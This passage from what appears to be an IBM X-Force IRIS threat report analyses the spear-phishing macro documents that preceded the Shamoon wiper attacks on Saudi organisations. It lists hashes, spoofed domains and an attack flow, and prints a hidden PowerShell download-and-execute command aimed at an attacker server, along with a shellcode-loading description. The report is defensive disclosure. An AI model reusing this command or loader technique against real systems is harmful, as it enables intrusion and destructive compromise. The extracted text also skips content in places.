These attacks, which occurred in November 2016 and January 2017, reportedly affected thousands of computers across multiple\n[government and civil organizations in Saudi Arabia and elsewhere in Gulf states. Shamoon is designed to destroy computer hard drives by wiping the master boot record (MBR) and data](https://www.infosecurity-magazine.com/news/saudi-arabia-issues-shamoon-2-alert/)\nirretrievably, unlike ransomware, which holds the data hostage for a fee.\n\nThrough their recent investigations, our forensics analysts pinpointed the initial compromise vector and post-compromise operations that led to the deployment of the destructive Shamoon\nmalware on targeted infrastructures. It’s worth mentioning that, according to X-Force IRIS, the initial compromise took place weeks before the actual Shamoon deployment and activation\nwere launched.\n\n### Shamoon Attacks Preceded by Malicious Macros and PowerShell Commands\n\nSince Shamoon incidents feature the infiltration and escalation stages of targeted attacks, X-Force IRIS responders sought out the attackers’ entry point. Their findings pointed to what\nappears to be the initial point of compromise the attackers used: a document containing a malicious macro that, when approved to execute, enabled C2 communications to the attacker’s\nserver and remote shell via PowerShell.\n\nThe document was not the only one discovered in the recent attack waves. X-Force IRIS researchers had been tracking earlier activity associated with similar malicious, PowerShell-laden\ndocuments themed as resumes and human resources documents, some of which related to organizations in Saudi Arabia. This research identified several bouts of offensive activity that\noccurred in the past few months, which revealed similar operational methods in which the attackers served malicious documents and other malware executables from web servers to their\ntargets to establish an initial foothold in the network.\n\n[Learn more about IBM X-Force IRIS](http://www.ibm.com/security/services/xforce-incident-response-and-intelligence.html?ce=ISM0484&ct=SWG&cmp=IBMSocial&cm=h&cr=Security&ccy=US)\n\n### Initial Compromise Vector Previously Unclear\n\n[Although Shamoon was previously documented in research blogs, the specific network compromise methods leading to the attacks have remained unclear in the reported cases. X-Force](http://www.ibm.com/software/products/en/category/infrastructure-protection?ce=ISM0484&ct=SWG&cmp=IBMSocial&cm=h&cr=Security&ccy=US)\nIRIS researchers studied Shamoon’s attack life cycle and observed its tactics at Saudi-based organizations and private sector companies. This research led them to believe that the actor\nusing Shamoon in recent attacks relied heavily on weaponized documents built to leverage PowerShell to establish their initial network foothold and subsequent operations:\n\n1. Attackers send a spear phishing email to employees at the target organization. The email contains a Microsoft Office document as an attachment.\n\n2. Opening the attachment from the email invokes PowerShell and enables command line access to the compromised machine.\n\n3. Attackers can now communicate with the compromised machine and remotely execute commands on it.\n\n4. The attackers use their access to deploy additional tools and malware to other endpoints or escalate privileges in the network.\n\n5. Attackers study the network by connecting to additional systems and locating critical servers.\n\n6. The attackers deploy the Shamoon malware.\n\n7. A coordinated Shamoon outbreak begins and computer hard drives across the organization are permanently wiped.\n\n\n-----\n\n_Figure 1: Shamoon Attack — Logical Flow of Events_\n\n### A Phish Is Speared\n\n[X-Force IRIS identified the below malicious document:](https://securityintelligence.com/ibm-x-force-iris-bringing-a-new-approach-to-incident-response/)\n\n**Detail** **Info**\n\n**File name** cv_itworx.doc\n\n**MD5** 45b0e5a457222455384713905f886bd4\n\n**SHA256** 528714aaaa4a083e72599c32c18aa146db503eee80da236b20aea11aa43bdf62\n\n\n**Hosting**\n**URL**\n\n**Embedded**\n**PowerShell**\n\n\nhxxp://mol.com-ho[.]me/cv_itworx.doc\n\nPowerShell.exe -window hidden -e\ncABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQB3ACAAaABpAGQAZABlAG4AIAAtAG4AbwBuAGkAIAAtAG4AbwBwACAALQBjACAAIgBpAGUAeAAoAE4A\n\n\n**Decode** PowerShell.exe -w hidden -noni -nop -c “iex(New-Object System.Net.WebClient).DownloadString(‘hxxp://139.59.46.154:3485/eiloShaegae1’)”\n\nOur researchers examined the domain that hosted the first malicious file, mol.com-ho[.]me. Per the domain’s WHOIS record, an anonymized registrant registered com-ho[.]me in October\n[2016 and used it to serve malicious documents with similar macro activation features.

MCI\nis Saudi Arabia’s Ministry of Commerce and Investment. It is possible these names were used in spear phishing emails because they would seem benign to Saudi-based employees and\nlure them to open the attachment.\n\nX-Force IRIS researchers further identified that the threat actor behind the malicious documents served many of them using a URL-shortening scheme in the following pattern:\nbriefl[.]ink/{a-z0-9}[5].\n\n|File Name|File MD5|\n|---|---|\n|cv.doc|f4d18316e367a80e1005f38445421b1f|\n|cv_itworx.doc|45b0e5a457222455384713905f886bd4|\n|cv_mci.doc|f4d18316e367a80e1005f38445421b1f|\n|discount_voucher_codes.xlsm|19cea065aa033f5bcfa94a583ae59c08|\n|Health_insurance_plan.doc|ecfc0275c7a73a9c7775130ebca45b74|\n|Health_insurance_registration.doc|1b5e33e5a244d2d67d7a09c4ccf16e56|\n|job_titles.doc|fa72c068361c05da65bf2117db76aaa8|\n|job_titles_itworx.doc|43fad2d62bc23ffdc6d301571135222c|\n|job_titles_mci.doc|ce25f1597836c28cf415394fb350ae93|\n|Password_Policy.xlsm|03ea9457bf71d51d8109e737158be888|\n\n|File Detail|Info|\n|---|---|\n\n\n-----\n\n|MD5|43fad2d62bc23ffdc6d301571135222c|\n|---|---|\n|SHA256|e5b643cb6ec30d0d0b458e3f2800609f260a5f15c4ac66faf4ebf384f7976df6|\n|Hosting URL|hxxp://briefl.ink/qhtma|\n\n\nThe following figure is a visual example of what employees may have encountered when they opened the malicious Word files sent to them in preparation for a Shamoon attack:\n\n_Figure 2: Malicious Word Document Delivered in Preparation of a Shamoon Malware Attack (Source: X-Force IRIS)_\n\nPassive DNS results on a communications domain associated with the Shamoon attack revealed related network infrastructure, identifying additional domains used by the threat actors.\n\n**Domain** **Spoofed Site**\n**Name**\n\n**ntg-sa[.]com** The domain ntg-sa[.]com appears to spoof the legit domain ntg.sa.com associated with the Namer Trading Group. Per their webpage, NTG “was established\nprimarily to cater the growing demands of Petrochemicals waste management within the Kingdom of Saudi Arabia.”\n\n**maps-** The maps-modon[.]club domain appears to spoof maps.modon.gov.sa, which is associated with the Saudi Industrial Property Authority, an organization\n**modon[.]club** “responsible for the development of industrial cities with integrated infrastructure and services.”\n\nX-Force IRIS discovered that the threat actor was hosting at least one malicious executable on a server hosted on ntg-sa[.]com. This file duped targets into believing it was a Flash player\ninstaller that would drop a Windows batch to invoke PowerShell into the same C2 communications.\n\n### Breakdown of the PowerShell-Related Macro\n\nAnalysis of one of the threat actor’s documents found that if the macro executes, it launches two separate PowerShell Scripts. The first one executes a PowerShell script served from\n[hxxp://139.59.46.154:3485/eiloShaegae1. The host is possibly related to attacks that served the Pupy RAT, a publicly available cross-platform remote access tool.](https://github.com/n1nj4sec/pupy)\n\nThe second script calls VirtualAlloc to create a buffer, uses memset to load Metasploit-related shellcode into that buffer and executes it through CreateThread. Metasploit is an open\nsource framework popular as a tool for developing and executing exploit code against a remote target machine. The shellcode performs a DWORD XOR of 4 bytes at an offset from the\nbeginning of the shellcode that changes the code to create a loop so the XOR continues 0x57 times.\n\nIf this execution is successful, it creates a buffer using VirtualAlloc and calls InternetReadFile in a loop until all the file contents are retrieved from hxxp://45.76.128.165:4443/0w0O6. This\nis then returned as a string to PowerShell, which calls invoke-expression (iex) on it, indicating that the expected payload is PowerShell.\n\nOf note, the macro contained a DownloadFile() function that would use URLDownloadToFileA, but this was never actually used.\n\n[Based on observations associated with the malicious document we observed subsequent shell sessions probably associated with Metasploit’s Meterpreter that enabled deployment of](https://www.offensive-security.com/metasploit-unleashed /meterpreter-basics/)\n\n|Domain Name|Spoofed Site|\n|---|---|\n|ntg-sa[.]com|The domain ntg-sa[.]com appears to spoof the legit domain ntg.sa.com associated with the Namer Trading Group.
